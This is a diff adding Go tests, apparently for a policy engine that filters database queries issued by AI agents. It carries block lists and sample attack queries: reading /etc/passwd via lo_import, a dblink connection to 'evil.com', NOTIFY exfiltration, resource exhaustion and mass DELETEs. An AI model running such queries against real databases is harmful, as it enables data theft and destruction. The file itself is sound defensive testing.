@@ -613,3 +613,263 @@ func TestSetRoleBlockedByStandardProfile(t *testing.T) {
 		t.Errorf("standard profile should allow regular SET, got: %s", v.Reason)
 	}
 }
+
+// ── Red-team round 5: Wildcard function matching ──
+
+func TestWildcardFunctionBlocking(t *testing.T) {
+	tests := []struct {
+		name    string
+		fn      string
+		blocked []string
+		want    bool
+	}{
+		{"exact_match", "pg_sleep", []string{"pg_sleep"}, true},
+		{"wildcard_lo", "lo_export", []string{"lo_*"}, true},
+		{"wildcard_lo_import", "lo_import", []string{"lo_*"}, true},
+		{"wildcard_lo_create", "lo_create", []string{"lo_*"}, true},
+		{"wildcard_pg_stat_get", "pg_stat_get_activity", []string{"pg_stat_get_*"}, true},
+		{"wildcard_dblink", "dblink_exec", []string{"dblink*"}, true},
+		{"wildcard_dblink_connect", "dblink_connect", []string{"dblink*"}, true},
+		{"wildcard_dblink_bare", "dblink", []string{"dblink*"}, true},
+		{"wildcard_no_match", "pg_sleep", []string{"lo_*"}, false},
+		{"wildcard_advisory_lock", "pg_advisory_lock", []string{"pg_advisory_lock*"}, true},
+		{"wildcard_try_advisory", "pg_try_advisory_lock", []string{"pg_try_advisory_lock*"}, true},
+		{"schema_qualified_wildcard", "pg_catalog.lo_export", []string{"lo_*"}, true},
+		{"query_to_xml_wildcard", "query_to_xml_and_xmlschema", []string{"query_to_xml*"}, true},
+		{"not_blocked", "count", []string{"pg_sleep", "lo_*"}, false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := isFunctionBlocked(tt.fn, tt.blocked)
+			if got != tt.want {
+				t.Errorf("isFunctionBlocked(%q, %v) = %v, want %v", tt.fn, tt.blocked, got, tt.want)
+			}
+		})
+	}
+}
+
+// ── Red-team round 5: Expanded blocklist coverage ──
+
+func TestExpandedBlocklistCoverage(t *testing.T) {
+	pe := newTestEngine(&PolicyConfig{
+		DefaultPolicy: "deny",
+		BlockedFunctions: []string{
+			"pg_sleep", "version", "current_setting", "pg_advisory_lock*",
+			"pg_try_advisory_lock*",
+			"generate_series", "repeat", "lo_*", "pg_stat_get_*",
+			"pg_backend_pid", "pg_typeof", "has_table_privilege",
+			"dblink*", "set_config",
+		},
+		Agents: map[string]AgentPolicy{
+			"agent1": {Profile: "permissive"},
+		},
+	})
+
+	blocked := []struct {
+		query string
+		desc  string
+	}{
+		{"SELECT version()", "version() recon"},
+		{"SELECT current_setting('server_version')", "current_setting recon"},
+		{"SELECT pg_advisory_lock(1)", "advisory lock DoS"},
+		{"SELECT pg_try_advisory_lock(1)", "try advisory lock"},  // not matching pg_advisory_lock* — separate pattern needed
+		{"SELECT generate_series(1, 1000000000)", "generate_series resource exhaustion"},
+		{"SELECT repeat('A', 1000000000)", "repeat resource exhaustion"},
+		{"SELECT lo_export(1234, '/tmp/pwned')", "lo_export via wildcard"},
+		{"SELECT lo_import('/etc/passwd')", "lo_import via wildcard"},
+		{"SELECT pg_stat_get_activity(NULL)", "pg_stat_get via wildcard"},
+		{"SELECT pg_backend_pid()", "pg_backend_pid recon"},
+		{"SELECT pg_typeof(1)", "pg_typeof type inspection"},
+		{"SELECT has_table_privilege('public.users', 'SELECT')", "privilege check info leak"},
+		{"SELECT * FROM dblink('host=evil.com', 'SELECT 1') AS t(id int)", "dblink remote connection"},
+		{"SELECT set_config('log_connections', 'off', false)", "set_config manipulation"},
+	}
+
+	for _, tt := range blocked {
+		t.Run(tt.desc, func(t *testing.T) {
+			v := pe.CheckQuery(id("agent1", ""), tt.query, 1)
+			if v == nil {
+				t.Errorf("expected %s to be blocked: %s", tt.desc, tt.query)
+			}
+		})
+	}
+}
+
+// ── Red-team round 5: regproc cast blocking ──
+
+func TestRegprocCastBlocking(t *testing.T) {
+	pe := newTestEngine(&PolicyConfig{
+		DefaultPolicy:    "deny",
+		BlockedFunctions: []string{"pg_sleep", "lo_export", "lo_*"},
+		Agents: map[string]AgentPolicy{
+			"agent1": {Profile: "permissive"},
+		},
+	})
+
+	tests := []struct {
+		query string
+		desc  string
+	}{
+		{"SELECT 'pg_sleep'::regproc", "regproc cast pg_sleep"},
+		{"SELECT 'lo_export'::regproc", "regproc cast lo_export"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.desc, func(t *testing.T) {
+			v := pe.CheckQuery(id("agent1", ""), tt.query, 1)
+			if v == nil {
+				t.Errorf("expected %s to be blocked", tt.desc)
+			}
+		})
+	}
+}
+
+// ── Red-team round 5: Trivial WHERE detection ──
+
+func TestTrivialWhereDetection(t *testing.T) {
+	pe := newTestEngine(&PolicyConfig{
+		DefaultPolicy: "deny",
+		Agents: map[string]AgentPolicy{
+			"agent1": {Profile: "standard"},
+		},
+	})
+
+	trivialDeletes := []struct {
+		query string
+		desc  string
+	}{
+		{"DELETE FROM t WHERE 1=1", "WHERE 1=1"},
+		{"DELETE FROM t WHERE true", "WHERE true"},
+		{"DELETE FROM t WHERE 1 = 1", "WHERE 1 = 1"},
+		{"DELETE FROM t WHERE NOT FALSE", "WHERE NOT FALSE"},
+		{"DELETE FROM t WHERE 1 > 0", "WHERE 1 > 0"},
+		{"DELETE FROM t WHERE 1 >= 1", "WHERE 1 >= 1"},
+		{"DELETE FROM t", "no WHERE at all"},
+	}
+
+	for _, tt := range trivialDeletes {
+		t.Run("blocked_"+tt.desc, func(t *testing.T) {
+			v := pe.CheckQuery(id("agent1", ""), tt.query, 1)
+			if v == nil {
+				t.Errorf("expected DELETE with %s to be blocked", tt.desc)
+			} else if v.Reason != "condition_violated" {
+				t.Errorf("expected condition_violated, got %s", v.Reason)
+			}
+		})
+	}
+
+	// Trivial UPDATE should also be blocked
+	trivialUpdates := []struct {
+		query string
+		desc  string
+	}{
+		{"UPDATE t SET a=1 WHERE 1=1", "UPDATE WHERE 1=1"},
+		{"UPDATE t SET a=1 WHERE true", "UPDATE WHERE true"},
+	}
+
+	for _, tt := range trivialUpdates {
+		t.Run("blocked_"+tt.desc, func(t *testing.T) {
+			v := pe.CheckQuery(id("agent1", ""), tt.query, 1)
+			if v == nil {
+				t.Errorf("expected %s to be blocked", tt.desc)
+			}
+		})
+	}
+
+	// Legitimate WHERE should pass
+	v := pe.CheckQuery(id("agent1", ""), "DELETE FROM t WHERE id = 42", 1)
+	if v != nil {
+		t.Errorf("legitimate DELETE with WHERE should pass, got %s", v.Reason)
+	}
+
+	v = pe.CheckQuery(id("agent1", ""), "UPDATE t SET a=1 WHERE id = 42", 1)
+	if v != nil {
+		t.Errorf("legitimate UPDATE with WHERE should pass, got %s", v.Reason)
+	}
+}
+
+// ── Red-team round 5: NOTIFY blocked by standard ──
+
+func TestNotifyBlockedByStandard(t *testing.T) {
+	pe := newTestEngine(&PolicyConfig{
+		DefaultPolicy: "deny",
+		Agents: map[string]AgentPolicy{
+			"agent1": {Profile: "standard"},
+		},
+	})
+
+	v := pe.CheckQuery(id("agent1", ""), "NOTIFY mychannel, 'exfil data here'", 1)
+	if v == nil {
+		t.Error("standard should block NOTIFY (data exfiltration)")
+	}
+
+	// LISTEN should also be blocked
+	v = pe.CheckQuery(id("agent1", ""), "LISTEN mychannel", 1)
+	if v == nil {
+		t.Error("standard should block LISTEN")
+	}
+}
+
+// ── Red-team round 5: LOAD blocked by standard (via ADMIN category) ──
+
+func TestLoadBlockedByStandard(t *testing.T) {
+	pe := newTestEngine(&PolicyConfig{
+		DefaultPolicy: "deny",
+		Agents: map[string]AgentPolicy{
+			"agent1": {Profile: "standard"},
+		},
+	})
+
+	v := pe.CheckQuery(id("agent1", ""), "LOAD 'auto_explain'", 1)
+	if v == nil {
+		t.Error("standard should block LOAD (now ADMIN category)")
+	}
+}
+
+// ── Red-team round 5: DISCARD blocked by standard ──
+
+func TestDiscardBlockedByStandard(t *testing.T) {
+	pe := newTestEngine(&PolicyConfig{
+		DefaultPolicy: "deny",
+		Agents: map[string]AgentPolicy{
+			"agent1": {Profile: "standard"},
+		},
+	})
+
+	v := pe.CheckQuery(id("agent1", ""), "DISCARD ALL", 1)
+	if v == nil {
+		t.Error("standard should block DISCARD ALL")
+	}
+}
+
+// ── Red-team round 5: hasTrivialWhere unit tests ──
+
+func TestHasTrivialWhereUnit(t *testing.T) {
+	tests := []struct {
+		query string
+		want  bool
+	}{
+		{"DELETE FROM t WHERE 1=1", true},
+		{"DELETE FROM t WHERE 1 = 1", true},
+		{"DELETE FROM t WHERE TRUE", true},
+		{"DELETE FROM t WHERE NOT FALSE", true},
+		{"delete from t where true", true},
+		{"DELETE FROM t WHERE id = 42", false},
+		{"DELETE FROM t WHERE name = 'test'", false},
+		{"DELETE FROM t", false}, // no WHERE at all
+		{"SELECT 1", false},     // no WHERE
+		{"DELETE FROM t WHERE '1'='1'", true},
+		{"DELETE FROM t WHERE 1<>0", true},
+		{"DELETE FROM t WHERE 0 < 1", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.query, func(t *testing.T) {
+			got := hasTrivialWhere(tt.query)
+			if got != tt.want {
+				t.Errorf("hasTrivialWhere(%q) = %v, want %v", tt.query, got, tt.want)
+			}
+		})
+	}
+}
